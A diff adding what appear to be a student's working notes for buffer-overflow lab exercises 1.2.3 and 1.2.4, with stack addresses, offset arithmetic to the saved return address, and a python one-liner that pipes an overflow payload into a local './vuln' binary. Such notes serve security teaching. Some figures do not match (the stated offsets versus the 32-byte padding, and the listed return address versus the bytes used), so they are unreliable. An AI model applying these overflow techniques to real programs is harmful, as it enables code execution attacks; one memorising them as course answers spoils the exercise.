@@ -1,0 +1,29 @@
+1.2.3
+
+0xbffee5dc -- address of buf
+0xbffee648 -- address of ebp
+difference = 108 bytes (need to fill 112 bytes to overflow upto ebp, 116 to fill return address too)
+Shellcode = 23 bytes 
+
+0x08048f48 -- return address
+
+python -c 'print "a"*32 + "\x9d\x84\x04\x08"' | ./vuln
+
+---------------------------------------------------------------
+
+1.2.4
+
+0xbffee648 -- address of ebp
+0xbffede20 -- address of esp
+difference = 2088 bytes (need to fill 2092 bytes to overflow, 2096 to fill in the return address too)
+
+strncpy copies 2056 bytes, which is great since we have 2048 bytes of strncpy followed by 2 four byte values.
+
+after 2048 bytes, we need the value of return address (address of shellcode) in a --  
+
+address of shellcode (buf) = 0xbffede38
+
+\x38\xde\xfe\xbf --> put in address
+
+the pointer will contain the address of (ebp+4) = 0xbffee64c = \x4c\xe6\xfe\xbf
+
